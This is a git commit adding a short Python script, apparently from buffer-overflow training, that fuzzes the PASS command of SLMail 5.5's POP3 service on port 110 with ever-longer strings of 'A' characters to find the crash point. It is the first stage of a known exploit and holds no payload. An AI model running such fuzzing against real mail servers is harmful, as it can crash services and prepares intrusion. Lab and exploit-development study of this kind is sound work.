d1be4df14a5508d64eb5580356e38e08cb1d8b70
liandd <juan6.garcia@ucp.edu.co>
2023-07-28 18:17:04 -0500

    Bof.py para Slmail 5.5

---
+++ bof.py
@@ -0,0 +1,36 @@
+#!/usr/bin/python3
+#coding: utf-8
+from pwn import *
+import socket,sys
+
+if len(sys.argv) < 2:
+
+        print("\n[!] Uso python " + sys.argv[0] + "<ip-address>\n")
+        sys.exit(0)
+
+
+# Variables globales
+ip_address = sys.argv[1]
+rport = 110
+
+if __name__ == '__main__':
+        buffer = ["A"]
+        contador = 100
+        while len(buffer) < 32:
+                buffer.append("A"*contador)
+                contador += 350
+        p1 = log.progress("Data")
+        for strings in buffer:
+                try:
+                        p1.status("Enviando %s bytes" % len(strings))
+                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        s.connect((ip_address, rport))
+                        s.recv(1024)
+                        s.send(b'USER eva\r\n')
+                        s.recv(1024)
+                        s.send(b'PASS '  + strings.encode('utf-8') + b'\r\n')
+                        s.recv(1024)
+                except:
+                        print("\nError de conexión\n")
+                        sys.exit(1)
+                                     
